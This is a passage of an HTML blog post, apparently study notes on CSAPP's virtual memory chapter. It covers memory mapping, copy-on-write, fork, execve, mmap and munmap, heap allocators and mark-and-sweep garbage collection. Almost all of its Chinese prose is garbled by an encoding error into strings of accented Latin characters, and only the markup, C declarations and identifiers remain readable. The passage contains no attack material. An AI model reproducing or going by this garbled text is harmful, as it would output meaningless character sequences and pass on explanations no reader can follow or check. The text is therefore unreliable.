å‘é€ç‰©ç†åœ°å€åˆ°ç¼“å­˜ï¼Œç¼“å­˜ä»ç‰©ç†åœ°å€ä¸­åˆ’åˆ†å‡º COã€ CIã€å’Œ CT ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%AB%AF%E5%88%B0%E7%AB%AF%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%E5%88%92%E5%88%86.png"></p><p>ç»„ 0x5 ä¸­çš„æ ‡è®°ä¸ CT ç›¸åŒ¹é…ï¼Œæ‰€ä»¥ç¼“å­˜æ£€æµ‹åˆ°ä¸€ä¸ªå‘½ä¸­ï¼Œè¯»å‡ºåœ¨åç§»é‡ COå¤„çš„æ•°æ®å­—èŠ‚ï¼ˆ0x36ï¼‰ï¼Œå¹¶å°†å®ƒè¿”ç»™ MMUï¼Œéšå MMU å°†å®ƒä¼ é€’å› CPUã€‚</p><h1 id="å†…å­˜æ˜ å°„"><a href="#å†…å­˜æ˜ å°„" class="headerlink" title="å†…å­˜æ˜ å°„"></a>å†…å­˜æ˜ å°„</h1><p>Linux é€šè¿‡å°†ä¸€ä¸ªè™šæ‹Ÿå†…å­˜åŒºåŸŸä¸ä¸€ä¸ªç£ç›˜ä¸Šçš„å¯¹è±¡å…³è”èµ·æ¥ï¼Œä»¥åˆå§‹åŒ–è¿™ä¸ªè™šæ‹Ÿå†…å­˜åŒºåŸŸçš„å†…å®¹ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸º<strong>å†…å­˜æ˜ å°„ï¼ˆmemory mappingï¼‰</strong>ã€‚</p><p>è™šæ‹Ÿå†…å­˜åŒºåŸŸå¯ä»¥æ˜ å°„åˆ°ä»¥ä¸‹ä¸¤ç§å¯¹è±¡ä¸­ï¼š</p><ul><li>Linux æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ™®é€šæ–‡ä»¶ï¼šæˆ‘ä»¬å°è¯•å»æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æˆ–è€…æ˜¯æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šåˆ›å»ºæ•°ä¸ªè™šæ‹Ÿå†…å­˜é¡µï¼Œå¹¶æŠŠå®ƒæ ‡è®°åˆ°è¿™ä¸ªæ–‡ä»¶æ‰€åœ¨ç£ç›˜çš„ä½ç½®ï¼Œé‚£ä¹ˆå°è¯•è¯»è¿™å—å†…å­˜çš„æ—¶å€™ç”±<strong>ç¼ºé¡µå¤„ç†ç¨‹åº</strong>è´Ÿè´£æŠŠç£ç›˜ä¸­çš„æ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¸­ã€‚</li><li>åŒ¿åæ–‡ä»¶ï¼šä¸€ä¸ªåŒºåŸŸä¹Ÿå¯ä»¥æ˜ å°„åˆ°ä¸€ä¸ªåŒ¿åæ–‡ä»¶ï¼ŒåŒ¿åæ–‡ä»¶æ˜¯ç”±å†…æ ¸åˆ›å»ºçš„ï¼ŒåŒ…å«çš„å…¨æ˜¯äºŒè¿›åˆ¶é›¶ï¼ŒåŒ¿åæ–‡ä»¶å­˜åœ¨çš„æ„ä¹‰æ˜¯ç”¨äºçˆ¶å­è¿›ç¨‹ä¹‹é—´é€šä¿¡è€Œä¸è¢«å…¶å®ƒè¿›ç¨‹è·å–ã€‚</li></ul><p>æ— è®ºåœ¨å“ªç§æƒ…å†µä¸­ï¼Œä¸€æ—¦ä¸€ä¸ªè™šæ‹Ÿé¡µé¢è¢«åˆå§‹åŒ–äº†ï¼Œå®ƒå°±åœ¨ä¸€ä¸ªç”±å†…æ ¸ç»´æŠ¤çš„ä¸“é—¨çš„<strong>äº¤æ¢æ–‡ä»¶ï¼ˆswap fileï¼‰</strong>ä¹‹é—´æ¢æ¥æ¢å»ï¼Œæ¢æ–‡ä»¶ä¹Ÿå«åšäº¤æ¢ç©ºé—´æˆ–è€…äº¤æ¢åŒºåŸŸã€‚</p><p>åœ¨ä»»ä½•æ—¶åˆ»ï¼Œäº¤æ¢æ–‡ä»¶éƒ½é™åˆ¶ç€å½“å‰è¿è¡Œçš„è¿›ç¨‹èƒ½å¤Ÿåˆ†é…çš„è™šæ‹Ÿé¡µé¢çš„æ€»æ•°ã€‚</p><h3 id="å…±äº«å¯¹è±¡"><a href="#å…±äº«å¯¹è±¡" class="headerlink" title="å…±äº«å¯¹è±¡"></a>å…±äº«å¯¹è±¡</h3><p>ä¸€ä¸ªå¯¹è±¡å¯ä»¥è¢«æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜çš„ä¸€ä¸ªåŒºåŸŸï¼Œè¦ä¹ˆä½œä¸ºå…±äº«å¯¹è±¡ï¼Œè¦ä¹ˆä½œä¸ºç§æœ‰å¯¹è±¡ã€‚å¦‚æœä¸€ä¸ªè¿›ç¨‹å°†ä¸€ä¸ªå…±äº«å¯¹è±¡æ˜ å°„åˆ°ä»–çš„è™šæ‹Ÿåœ°å€çš„ä¸€ä¸ªåŒºåŸŸï¼Œé‚£ä¹ˆå®ƒå¯¹è¿™ä¸ªåŒºåŸŸçš„æ“ä½œå¯¹å…¶ä»–è¿›ç¨‹å¯è§ï¼ŒåŒæ—¶å¯ä»¥åæ˜ åˆ°ç£ç›˜ä¸Šï¼Œä½†æ˜¯å¦‚æœæ˜ å°„åˆ°äº†ç§æœ‰åŒºåŸŸï¼Œé‚£ä¹ˆå…¶ä»–è¿›ç¨‹ä¸å¯è§ï¼Œè€Œä¸”ä¸ä¼šåœ¨ç£ç›˜ä¸Šå‘ç”Ÿå˜åŒ–ã€‚</p><p>å¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬å‡è®¾è¿›ç¨‹1å°†å…±äº«å¯¹è±¡æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ï¼ˆaï¼‰ï¼Œè€Œåè¿›ç¨‹2å°†åŒä¸€ä¸ªé€šå‘å¯¹è±¡æ˜ å°„åˆ°å®ƒçš„åœ°å€åŒºåŸŸã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E5%85%B1%E4%BA%AB%E5%AF%B9%E8%B1%A1.png"></p><p>å› ä¸ºæ¯ä¸€ä¸ªå¯¹è±¡éƒ½æœ‰å”¯ä¸€çš„æ–‡ä»¶åï¼Œå†…æ ¸å°±å¯ä»¥è¿…é€Ÿé”å®šè™šæ‹Ÿè¿›ç¨‹å·²ç»æ˜ å°„ï¼Œæ‰€ä»¥ç‰©ç†åœ°å€åªéœ€è¦å­˜æ”¾å…±äº«å¯¹è±¡çš„ä¸€ä¸ªå‰¯æœ¬ã€‚</p><p>ç§æœ‰å¯¹è±¡ä½¿ç”¨å†™æ—¶å¤åˆ¶çš„æŠ€æœ¯æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ä¸­ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%A7%81%E6%9C%89%E5%AF%B9%E8%B1%A1%E6%98%A0%E5%B0%84.png"></p><p>ç¬¬ä¸€æ¬¡å†™å†…å­˜åŒºåŸŸæ—¶ï¼Œé‡æ–°åˆ†é…æ–°çš„ç‰©ç†å†…å­˜ï¼Œå¹¶æŠŠæ­¤æ®µå†…å­˜æ‹·è´åˆ°ä¸Šé¢å»ï¼Œç„¶åé‡æ–°æ”¹å˜é‚£ä¸ªè¿›ç¨‹çš„é¡µè¡¨ï¼ŒæŠŠå¯¹åº”çš„è™šæ‹Ÿå†…å­˜åŒºåŸŸæ˜ å°„æ”¹åˆ°æˆ‘ä»¬æ–°å¤åˆ¶çš„ç‰©ç†å†…å­˜åŒºåŸŸã€‚</p><h3 id="forkå‡½æ•°"><a href="#forkå‡½æ•°" class="headerlink" title="forkå‡½æ•°"></a>forkå‡½æ•°</h3><p>å½“ fork å‡½æ•°è¢«å½“å‰è¿›ç¨‹è°ƒç”¨æ—¶ï¼Œå†…æ ¸ä¸ºæ–°è¿›ç¨‹åˆ›å»ºå„ç§æ•°æ®ç»“æ„ï¼Œå¹¶åˆ†é…ç»™å®ƒä¸€ä¸ªå”¯ä¸€çš„ PIDã€‚ä¸ºäº†ç»™è¿™ä¸ªæ–°è¿›ç¨‹åˆ›å»ºè™šæ‹Ÿå†…å­˜ï¼Œå®ƒåˆ›å»ºäº†å½“å‰è¿›ç¨‹çš„ mm_structã€åŒºåŸŸç»“æ„å’Œé¡µè¡¨çš„åŸæ ·å‰¯æœ¬ã€‚å®ƒå°†ä¸¤ä¸ªè¿›ç¨‹ä¸­çš„æ¯ä¸ªé¡µé¢éƒ½æ ‡è®°ä¸ºåªè¯»ï¼Œå¹¶å°†ä¸¤ä¸ªè¿›ç¨‹ä¸­çš„æ¯ä¸ªåŒºåŸŸç»“æ„éƒ½æ ‡è®°ä¸ºç§æœ‰çš„å†™æ—¶å¤åˆ¶ã€‚</p><p>å½“ fork åœ¨æ–°è¿›ç¨‹ä¸­è¿”å›æ—¶ï¼Œæ–°è¿›ç¨‹ç°åœ¨çš„è™šæ‹Ÿå†…å­˜åˆšå¥½å’Œè°ƒç”¨ fork æ—¶å­˜åœ¨çš„è™šæ‹Ÿå†…å­˜ç›¸åŒã€‚å½“è¿™ä¸¤ä¸ªè¿›ç¨‹ä¸­çš„ä»»ä¸€ä¸ªåæ¥è¿›è¡Œå†™æ“ä½œæ—¶ï¼Œå†™æ—¶å¤åˆ¶æœºåˆ¶å°±ä¼šåˆ›å»ºæ–°é¡µé¢ã€‚å› æ­¤ï¼Œä¹Ÿå°±ä¸ºæ¯ä¸ªè¿›ç¨‹ä¿æŒäº†ç§æœ‰åœ°å€ç©ºé—´çš„æŠ½è±¡æ¦‚å¿µã€‚</p><h3 id="execveå‡½æ•°"><a href="#execveå‡½æ•°" class="headerlink" title="execveå‡½æ•°"></a>execveå‡½æ•°</h3><p>å½“æˆ‘ä»¬çš„è¿›ç¨‹è°ƒç”¨ <code>execve(&quot;a.out&quot;,NULL,NULL);</code>ï¼ŒåŠ è½½å¹¶è¿è¡Œ a.out æœ‰ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p><ol><li><strong>åˆ é™¤å·²å­˜åœ¨çš„ç”¨æˆ·åŒºåŸŸ</strong>ï¼šåˆ é™¤å½“å‰è¿›ç¨‹è™šæ‹Ÿåœ°å€çš„ç”¨æˆ·éƒ¨åˆ†ä¸­çš„å·²å­˜åœ¨çš„åŒºåŸŸç»“æ„ã€‚</li><li><strong>æ˜ å°„ç§æœ‰åŒºã€‚</strong>ï¼šä¸ºæ–°ç¨‹åºçš„ä»£ç ã€æ•°æ®ã€bss å’Œæ ˆåŒºåŸŸåˆ›å»ºæ–°çš„åŒºåŸŸç»“æ„ã€‚æ‰€æœ‰è¿™äº›æ–°çš„åŒºåŸŸéƒ½æ˜¯ç§æœ‰çš„ã€å†™æ—¶å¤åˆ¶çš„ã€‚ä»£ç å’Œæ•°æ®åŒºåŸŸè¢«æ˜ å°„ä¸º a.out æ–‡ä»¶ä¸­çš„. text å’Œ. data åŒºã€‚bss åŒºåŸŸæ˜¯è¯·æ±‚äºŒè¿›åˆ¶é›¶çš„ï¼Œæ˜ å°„åˆ°åŒ¿åæ–‡ä»¶ï¼Œå…¶å¤§å°åŒ…å«åœ¨ a.out ä¸­ã€‚æ ˆå’Œå †åŒºåŸŸä¹Ÿæ˜¯è¯·æ±‚äºŒè¿›åˆ¶é›¶çš„ï¼Œåˆå§‹é•¿åº¦ä¸ºé›¶ã€‚å›¾ä¸­æ¦‚æ‹¬äº†ç§æœ‰åŒºåŸŸçš„ä¸åŒæ˜ å°„ã€‚</li><li><strong>æ˜ å°„å…±äº«åŒºåŸŸ</strong>ï¼šå¦‚æœ a.out ç¨‹åºä¸å…±äº«å¯¹è±¡ï¼ˆæˆ–ç›®æ ‡ï¼‰é“¾æ¥ï¼Œæ¯”å¦‚æ ‡å‡† C åº“ libc.soï¼Œé‚£ä¹ˆè¿™äº›å¯¹è±¡éƒ½æ˜¯åŠ¨æ€é“¾æ¥åˆ°è¿™ä¸ªç¨‹åºçš„ï¼Œç„¶åå†æ˜ å°„åˆ°ç”¨æˆ·è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„å…±äº«åŒºåŸŸå†…ã€‚</li><li><strong>è®¾ç½®ç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰</strong>ï¼šexecve åšçš„æœ€åä¸€ä»¶äº‹æƒ…å°±æ˜¯è®¾ç½®å½“å‰è¿›ç¨‹ä¸Šä¸‹æ–‡ä¸­çš„ç¨‹åºè®¡æ•°å™¨ï¼Œä½¿ä¹‹æŒ‡å‘ä»£ç åŒºåŸŸçš„å…¥å£ç‚¹ã€‚</li></ol><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-exevce.png"></p><h3 id="ä½¿ç”¨-mmap-å‡½æ•°çš„ç”¨æˆ·åŠå†…å­˜æ˜ å°„"><a href="#ä½¿ç”¨-mmap-å‡½æ•°çš„ç”¨æˆ·åŠå†…å­˜æ˜ å°„" class="headerlink" title="ä½¿ç”¨ mmap å‡½æ•°çš„ç”¨æˆ·åŠå†…å­˜æ˜ å°„"></a>ä½¿ç”¨ mmap å‡½æ•°çš„ç”¨æˆ·åŠå†…å­˜æ˜ å°„</h3><p>Linux è¿›ç¨‹å¯ä»¥ä½¿ç”¨ mmap å‡½æ•°æ¥åˆ›å»ºæ–°çš„è™šæ‹Ÿå†…å­˜åŒºåŸŸï¼Œå¹¶å°†å¯¹è±¡æ˜ å°„åˆ°è¿™äº›åŒºåŸŸä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *start, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags,</span><br><span class="hljs-params">           <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;<br><br><span class="hljs-comment">// è¿”å›ï¼šè‹¥æˆåŠŸæ—¶åˆ™ä¸ºæŒ‡å‘æ˜ å°„åŒºåŸŸçš„æŒ‡é’ˆï¼Œè‹¥å‡ºé”™åˆ™ä¸º MAP_FAILED(-1)ã€‚</span><br></code></pre></td></tr></table></figure><p>mmap å‡½æ•°è¦æ±‚å†…æ ¸åˆ›å»ºä¸€ä¸ªæ–°çš„è™šæ‹Ÿå†…å­˜åŒºåŸŸï¼Œæœ€å¥½æ˜¯ä»åœ°å€ start å¼€å§‹çš„ä¸€ä¸ªåŒºåŸŸï¼Œå¹¶å°†æ–‡ä»¶æè¿°ç¬¦ fd æŒ‡å®šçš„å¯¹è±¡çš„ä¸€ä¸ªè¿ç»­çš„ç‰‡ï¼ˆchunkï¼‰æ˜ å°„åˆ°è¿™ä¸ªæ–°çš„åŒºåŸŸã€‚è¿ç»­çš„å¯¹è±¡ç‰‡å¤§å°ä¸º length å­—èŠ‚ï¼Œä»è·æ–‡ä»¶å¼€å§‹å¤„åç§»é‡ä¸º offset å­—èŠ‚çš„åœ°æ–¹å¼€å§‹ã€‚start åœ°å€ä»…ä»…æ˜¯ä¸€ä¸ªæš—ç¤ºï¼Œé€šå¸¸è¢«å®šä¹‰ä¸º NULLã€‚ä¸ºäº†æˆ‘ä»¬çš„ç›®çš„ï¼Œæˆ‘ä»¬æ€»æ˜¯å‡è®¾èµ·å§‹åœ°å€ä¸º NULLã€‚</p><p>ä¸‹å›¾æè¿°äº†å‚æ•°çš„æ„ä¹‰ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-mmap%E5%8F%82%E6%95%B0.png"></p><p>å…¶ä¸­å‚æ•° prot åŒ…å«æè¿°æ–°æ˜ å°„çš„è™šæ‹Ÿå†…å­˜åŒºåŸŸçš„è®¿é—®æƒé™ä½ï¼ˆå³åœ¨ç›¸åº”åŒºåŸŸç»“æ„ä¸­çš„ vm_prot ä½ï¼‰ã€‚</p><ul><li>PROT_EXECï¼šè¿™ä¸ªåŒºåŸŸå†…çš„é¡µé¢ç”±å¯ä»¥è¢« CPU æ‰§è¡Œçš„æŒ‡ä»¤ç»„æˆã€‚</li><li>PROT_READï¼šè¿™ä¸ªåŒºåŸŸå†…çš„é¡µé¢å¯è¯»ã€‚</li><li>PROT_WRITEï¼šè¿™ä¸ªåŒºåŸŸå†…çš„é¡µé¢å¯å†™ã€‚</li><li>PROT_NONEï¼šè¿™ä¸ªåŒºåŸŸå†…çš„é¡µé¢ä¸èƒ½è¢«è®¿é—®</li></ul><p>å‚æ•° flags ç”±æè¿°è¢«æ˜ å°„å¯¹è±¡ç±»å‹çš„ä½ç»„æˆã€‚å¦‚æœè®¾ç½®äº† MAP_ANON æ ‡è®°ä½ï¼Œé‚£ä¹ˆè¢«æ˜ å°„çš„å¯¹è±¡å°±æ˜¯ä¸€ä¸ªåŒ¿åå¯¹è±¡ï¼Œè€Œç›¸åº”çš„è™šæ‹Ÿé¡µé¢æ˜¯è¯·æ±‚äºŒè¿›åˆ¶é›¶çš„ã€‚MAP_PRI-VATE è¡¨ç¤ºè¢«æ˜ å°„çš„å¯¹è±¡æ˜¯ä¸€ä¸ªç§æœ‰çš„ã€å†™æ—¶å¤åˆ¶çš„å¯¹è±¡ï¼Œè€Œ MAP_SHARED è¡¨ç¤ºæ˜¯ä¸€ä¸ªå…±äº«å¯¹è±¡ã€‚</p><p>ä¾‹å¦‚ï¼š<code>bufp = Mmap(NULL, size, PROT_READ, MAP_PRIVATE|MAP_ANON, 0, 0);</code></p><p>è®©å†…æ ¸åˆ›å»ºä¸€ä¸ªæ–°çš„åŒ…å« size å­—èŠ‚çš„åªè¯»ã€ç§æœ‰ã€è¯·æ±‚äºŒè¿›åˆ¶é›¶çš„è™šæ‹Ÿå†…å­˜åŒºåŸŸã€‚å¦‚æœè°ƒç”¨æˆåŠŸï¼Œé‚£ä¹ˆ bufp åŒ…å«æ–°åŒºåŸŸçš„åœ°å€ã€‚</p><p>ä½¿ç”¨ ummap åˆ é™¤åœ¨è™šæ‹Ÿå†…å­˜ä¸­æ˜ å°„çš„åŒºåŸŸï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">munmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *start, <span class="hljs-type">size_t</span> length)</span>;<br><br><span class="hljs-comment">// è¿”å›ï¼šè‹¥æˆåŠŸåˆ™ä¸º 0ï¼Œè‹¥å‡ºé”™åˆ™ä¸º -1ã€‚</span><br></code></pre></td></tr></table></figure><p>åˆ é™¤ä¹‹åä¹‹åå†å¯¹æ­¤åŒºåŸŸå¼•ç”¨ä¼šå¼•å‘æ®µé”™è¯¯ã€‚</p><h1 id="åŠ¨æ€å†…å­˜åˆ†é…"><a href="#åŠ¨æ€å†…å­˜åˆ†é…" class="headerlink" title="åŠ¨æ€å†…å­˜åˆ†é…"></a>åŠ¨æ€å†…å­˜åˆ†é…</h1><p>åŠ¨æ€å†…å­˜åˆ†é…å™¨ç»´æŠ¤ç€ä¸€ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜åŒºåŸŸï¼Œç§°ä¸ºå †ï¼ˆheapï¼‰ã€‚å †æ˜¯ä¸€ä¸ªè¯·æ±‚äºŒè¿›åˆ¶é›¶çš„åŒºåŸŸï¼Œå®ƒç´§æ¥åœ¨æœªåˆå§‹åŒ–çš„æ•°æ®åŒºåŸŸåå¼€å§‹ï¼Œå¹¶å‘ä¸Šç”Ÿé•¿ã€‚å¯¹äºæ¯ä¸ªè¿›ç¨‹ï¼Œå†…æ ¸ç»´æŠ¤ç€ä¸€ä¸ªå˜é‡ brkï¼Œå®ƒæŒ‡å‘å †çš„é¡¶éƒ¨ã€‚</p><p>åˆ†é…å™¨å°†å †è§†ä¸ºä¸€ç»„ä¸åŒå¤§å°çš„å—çš„é›†åˆæ¥ç»´æŠ¤ã€‚æ¯ä¸ªå—å°±æ˜¯ä¸€ä¸ªè¿ç»­çš„è™šæ‹Ÿå†…å­˜ç‰‡ï¼ˆchunkï¼‰ï¼Œè¦ä¹ˆæ˜¯å·²åˆ†é…çš„ï¼Œè¦ä¹ˆæ˜¯ç©ºé—²çš„ã€‚å·²åˆ†é…çš„å—æ˜¾å¼åœ°ä¿ç•™ä¸ºä¾›åº”ç”¨ç¨‹åºä½¿ç”¨ï¼Œç©ºé—²å—å¯ç”¨æ¥åˆ†é…ã€‚ç©ºé—²å—ä¿æŒç©ºé—²ï¼Œç›´åˆ°å®ƒæ˜¾å¼åœ°è¢«åº”ç”¨æ‰€åˆ†é…ï¼›ä¸€ä¸ªå·²åˆ†é…çš„å—ä¿æŒå·²åˆ†é…çŠ¶æ€ï¼Œç›´åˆ°å®ƒè¢«é‡Šæ”¾ï¼Œè¿™ç§é‡Šæ”¾è¦ä¹ˆæ˜¯åº”ç”¨ç¨‹åºæ˜¾å¼æ‰§è¡Œçš„ï¼Œè¦ä¹ˆæ˜¯å†…å­˜åˆ†é…å™¨è‡ªèº«éšå¼æ‰§è¡Œçš„ã€‚</p><p>åˆ†é…å™¨æœ‰ä¸¤ç§é£æ ¼ï¼š</p><ul><li>æ˜¾å¼åˆ†é…å™¨ï¼ˆexplicit allocatorï¼‰ï¼šè¦æ±‚å—åœ¨ä¸ç”¨çš„æ—¶å€™è¿›è¡Œé‡Šæ”¾ï¼Œå¦åˆ™ä¼šé€ æˆå†…å­˜èµ„æºæ³„éœ²ã€‚ä¾‹å¦‚ï¼ŒCç¨‹åºé€šè¿‡è°ƒç”¨ malloc æ•°æ¥åˆ†é…ä¸€ä¸ªå—ï¼Œå¹¶é€šè¿‡è°ƒç”¨ free å‡½æ•°æ¥é‡Šæ”¾ä¸€ä¸ªå—ã€‚è¿™ä¸¤ä¸ªæ“ä½œå¯¹åº”C++ä¸­çš„ new å’Œ delete æ“ä½œç¬¦ã€‚</li><li>éšå¼åˆ†é…å™¨ï¼ˆimplicit allocatorï¼‰ï¼šå°±æ˜¯è‡ªåŠ¨å›æ”¶ä¸å†éœ€è¦çš„å·²åˆ†é…å—ã€‚éšå¼åˆ†é…å™¨ä¹Ÿå«åšåƒåœ¾æ”¶é›†å™¨ï¼ˆgarbage collectorï¼‰ï¼Œè€Œè‡ªåŠ¨é‡Šæ”¾æœªä½¿ç”¨çš„å·²åˆ†é…çš„å—çš„è¿‡ç¨‹å«åšåƒåœ¾æ”¶é›†ï¼ˆgarbage collectionï¼‰ã€‚ä¾‹å¦‚ï¼Œè¯¸å¦‚ Lispã€ML ä»¥åŠ Java ä¹‹ç±»çš„é«˜çº§è¯­è¨€å°±ä¾èµ–åƒåœ¾æ”¶é›†æ¥é‡Šæ”¾å·²åˆ†é…<br>çš„å—ã€‚</li></ul><h3 id="malloc-å’Œ-free-å‡½æ•°"><a href="#malloc-å’Œ-free-å‡½æ•°" class="headerlink" title="malloc å’Œ free å‡½æ•°"></a>malloc å’Œ free å‡½æ•°</h3><p>å‡ºç°äº†ï¼å †éƒ¨åˆ†ï¼</p><p>ä¹‹åå•ç‹¬å†™ğŸ¤—</p><h1 id="åƒåœ¾æ”¶é›†"><a href="#åƒåœ¾æ”¶é›†" class="headerlink" title="åƒåœ¾æ”¶é›†"></a>åƒåœ¾æ”¶é›†</h1><p>åœ¨å‰é¢æœ‰æåˆ°è¿‡åˆ†é…å™¨ï¼Œæ˜¾ç¤ºåˆ†é…å™¨ä¸­æåˆ°ï¼Œæ˜¾ç¤ºåˆ†é…å™¨ä¹Ÿç§°ä¸ºåƒåœ¾æ”¶é›†å™¨ã€‚</p><p><strong>åƒåœ¾æ”¶é›†å™¨</strong>ï¼ˆgarbage collectorï¼‰æ˜¯ä¸€ç§åŠ¨æ€å†…å­˜åˆ†é…å™¨ï¼Œå®ƒè‡ªåŠ¨é‡Šæ”¾ç¨‹åºä¸å†éœ€è¦çš„å·²åˆ†é…å—ã€‚è¿™äº›å—è¢«ç§°ä¸º<strong>åƒåœ¾</strong>ï¼ˆgarbageï¼‰ï¼ˆå› æ­¤æœ¯è¯­å°±ç§°ä¹‹ä¸ºåƒåœ¾æ”¶é›†å™¨ï¼‰ã€‚è‡ªåŠ¨å›æ”¶å †å­˜å‚¨çš„è¿‡ç¨‹å«åš<strong>åƒåœ¾æ”¶é›†</strong>ï¼ˆgarbagecollectionï¼‰ã€‚åœ¨ä¸€ä¸ªæ”¯æŒåƒåœ¾æ”¶é›†çš„ç³»ç»Ÿä¸­ï¼Œåº”ç”¨æ˜¾å¼åˆ†é…å †å—ï¼Œä½†æ˜¯ä»ä¸æ˜¾ç¤ºåœ°é‡Šæ”¾å®ƒä»¬ã€‚åœ¨ C ç¨‹åºçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œåº”ç”¨è°ƒç”¨ mallocï¼Œä½†æ˜¯ä»ä¸è°ƒç”¨ freeã€‚åä¹‹ï¼Œåƒåœ¾æ”¶é›†å™¨å®šæœŸè¯†åˆ«åƒåœ¾å—ï¼Œå¹¶ç›¸åº”åœ°è°ƒç”¨ freeï¼Œå°†è¿™äº›å—æ”¾å›åˆ°ç©ºé—²é“¾è¡¨ä¸­ã€‚</p><h3 id="åƒåœ¾æ”¶é›†å™¨çš„åŸºæœ¬çŸ¥è¯†"><a href="#åƒåœ¾æ”¶é›†å™¨çš„åŸºæœ¬çŸ¥è¯†" class="headerlink" title="åƒåœ¾æ”¶é›†å™¨çš„åŸºæœ¬çŸ¥è¯†"></a>åƒåœ¾æ”¶é›†å™¨çš„åŸºæœ¬çŸ¥è¯†</h3><p>åƒåœ¾æ”¶é›†å™¨å°†å†…å­˜è§†ä¸ºä¸€å¼ æœ‰å‘å¯è¾¾å›¾ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8%E5%8F%AF%E8%BE%BE%E6%9C%89%E5%90%91%E5%9B%BE.png"></p><p>ä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬åœ¨å¤–éƒ¨çš„å†…å­˜ä¸­ï¼Œæ²¡æœ‰æŒ‡é’ˆèƒ½å¤Ÿè®¿é—®çš„æŸä¸ªå †å—çš„æ—¶å€™ï¼Œè¿™ä¸ªå †å—å°±æ˜¯ä¸€ä¸ªâ€œåƒåœ¾â€äº†ã€‚</p><h3 id="Mark-amp-Sweep-åƒåœ¾æ”¶é›†å™¨"><a href="#Mark-amp-Sweep-åƒåœ¾æ”¶é›†å™¨" class="headerlink" title="Mark&amp;Sweep åƒåœ¾æ”¶é›†å™¨"></a>Mark&amp;Sweep åƒåœ¾æ”¶é›†å™¨</h3><p>Mark&amp;Sweep åƒåœ¾æ”¶é›†å™¨ç”±æ ‡è®°ï¼ˆmarkï¼‰é˜¶æ®µå’Œæ¸…é™¤ï¼ˆsweepï¼‰é˜¶æ®µç»„æˆï¼Œæ ‡è®°é˜¶æ®µæ ‡è®°å‡ºæ ¹èŠ‚ç‚¹çš„æ‰€æœ‰å¯è¾¾çš„å’Œå·²åˆ†é…çš„åç»§ï¼Œè€Œåé¢çš„æ¸…é™¤é˜¶æ®µé‡Šæ”¾æ¯ä¸ªæœªè¢«æ ‡è®°çš„å·²åˆ†é…å—ã€‚</p><p>å—å¤´éƒ¨ä¸­ç©ºé—²çš„ä½ä½ä¸­çš„ä¸€ä½é€šå¸¸ç”¨æ¥è¡¨ç¤ºè¿™ä¸ªå—æ˜¯å¦è¢«æ ‡è®°äº†ã€‚</p><p>æˆ‘ä»¬å‡è®¾ Mark&amp;Sweep åƒåœ¾æ”¶é›†å™¨ä½¿ç”¨å¦‚ä¸‹å‡½æ•°è¿›è¡Œæ“ä½œï¼š</p><ul><li><code>ptr isPtr (ptr p)</code>ï¼šå¦‚æœ p æŒ‡å‘ä¸€ä¸ªå·²åˆ†é…å—ä¸­çš„æŸä¸ªå­—ï¼Œé‚£ä¹ˆå°±è¿”å›ä¸€ä¸ªæŒ‡å‘è¿™ä¸ªå—çš„èµ·å§‹ä½ç½®çš„æŒ‡é’ˆ bï¼Œå¦åˆ™è¿”å› NULLã€‚</li><li><code>int blockMarked(ptr b)</code>ï¼šå¦‚æœå— b æ˜¯å·²æ ‡è®°çš„ï¼Œé‚£ä¹ˆå°±è¿”å› trueã€‚</li><li><code>int 